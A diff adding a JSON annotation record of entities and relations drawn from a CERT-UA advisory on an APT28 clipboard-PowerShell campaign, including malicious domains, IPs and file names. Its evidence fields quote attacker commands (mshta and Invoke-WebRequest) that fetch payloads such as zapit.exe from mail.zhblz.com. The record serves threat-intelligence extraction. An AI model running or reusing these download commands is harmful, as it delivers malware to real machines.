@@ -1,0 +1,172 @@
+{
+  "docId": 6281123,
+  "date": "25.10.2024",
+  "title": "Кібератака UAC-0001 (APT28): PowerShell-команда в буфері обміну як \"точка входу\" (CERT-UA#11689)",
+  "entities": [
+    {
+      "id": "6281123:0",
+      "name": "UAC-0001",
+      "kind": "threat actor",
+      "gloss": "A threat actor group also known as APT28, associated with Russian cyber espionage activities.",
+      "scheme": "S14",
+      "category": "HackerGroup",
+      "role": "attacker"
+    },
+    {
+      "id": "6281123:1",
+      "name": "APT28",
+      "kind": "threat actor",
+      "gloss": "A Russian advanced persistent threat group attributed to the Russian General Staff Main Intelligence Directorate (GRU).",
+      "scheme": "S14",
+      "category": "HackerGroup",
+      "role": null
+    },
+    {
+      "id": "6281123:2",
+      "name": "Browser.ps1",
+      "kind": "malware",
+      "gloss": "A malicious PowerShell script used to exfiltrate browser credentials, set up SSH tunneling, and execute Metasploit.",
+      "scheme": "S6",
+      "category": "Software",
+      "role": "attacker"
+    },
+    {
+      "id": "6281123:3",
+      "name": "browser.hta",
+      "kind": "malware",
+      "gloss": "A malicious HTML Application file downloaded and executed to clear the clipboard and deploy payloads.",
+      "scheme": "S6",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6281123:4",
+      "name": "METASPLOIT",
+      "kind": "software product",
+      "gloss": "A widely used penetration testing framework and exploitation tool abused by threat actors.",
+      "scheme": "S2",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6281123:5",
+      "name": "zapit.exe",
+      "kind": "malware",
+      "gloss": "A malicious executable file delivering a Metasploit payload.",
+      "scheme": "S6",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6281123:6",
+      "name": "rdp.exe",
+      "kind": "computer file",
+      "gloss": "An executable file identified as an indicator of compromise in the malicious activity.",
+      "scheme": "S11",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "6281123:7",
+      "name": "Roundcube",
+      "kind": "software product",
+      "gloss": "An open-source webmail software application.",
+      "scheme": "S2",
+      "category": "Software",
+      "role": "target"
+    },
+    {
+      "id": "6281123:8",
+      "name": "CVE-2023-43770",
+      "kind": "vulnerability",
+      "gloss": "A cross-site scripting vulnerability in Roundcube Webmail leading to information disclosure.",
+      "scheme": "S1",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6281123:9",
+      "name": "mail.zhblz.com",
+      "kind": "domain name",
+      "gloss": "A compromised domain used as command and control infrastructure to distribute payloads.",
+      "scheme": "S13",
+      "category": "Domain",
+      "role": "attacker"
+    },
+    {
+      "id": "6281123:10",
+      "name": "docs.google.com.spreadsheets.d.1ip6eeakdebmwteh36vana4hu-glaeksstsht-boujdk.zhblz.com",
+      "kind": "domain name",
+      "gloss": "A malicious phishing domain masquerading as a Google Sheets URL.",
+      "scheme": "S13",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6281123:11",
+      "name": "doc.gmail.com.gyehddhrggdii323sdhnshiswh2udhqjwdhhfjcjeuejcj.zhblz.com",
+      "kind": "domain name",
+      "gloss": "A malicious phishing domain masquerading as a Google Docs URL.",
+      "scheme": "S13",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6281123:12",
+      "name": "203.161.50.145",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the compromised server mail.zhblz.com.",
+      "scheme": "S9",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "6281123:13",
+      "name": "45.61.169.221",
+      "kind": "ip address",
+      "gloss": "An IP address observed in the network indicators of compromise.",
+      "scheme": "S9",
+      "category": null,
+      "role": null
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0001",
+      "type": "uses",
+      "tail": "Browser.ps1",
+      "evidence": "описана активність асоційована з діяльністю угрупування UAC-0001"
+    },
+    {
+      "head": "UAC-0001",
+      "type": "uses",
+      "tail": "mail.zhblz.com",
+      "evidence": "використовувався (скомпрометований) сервер \"mail.zhblz[.]com\""
+    },
+    {
+      "head": "Browser.ps1",
+      "type": "delivers",
+      "tail": "METASPLOIT",
+      "evidence": "завантаження та запуск програмного засобу METASPLOIT"
+    },
+    {
+      "head": "mail.zhblz.com",
+      "type": "hosts",
+      "tail": "browser.hta",
+      "evidence": "mshta hXXps://mail.zhblz[.]com/b"
+    },
+    {
+      "head": "mail.zhblz.com",
+      "type": "hosts",
+      "tail": "zapit.exe",
+      "evidence": "Invoke-WebRequest -Uri https://mail.zhblz.com/z -OutFile %APPDATA%\\zapit.exe"
+    },
+    {
+      "head": "CVE-2023-43770",
+      "type": "affects",
+      "tail": "Roundcube",
+      "evidence": "вразливості в Roundcube (CVE-2023-43770)"
+    }
+  ],
+  "unclassified": []
+}
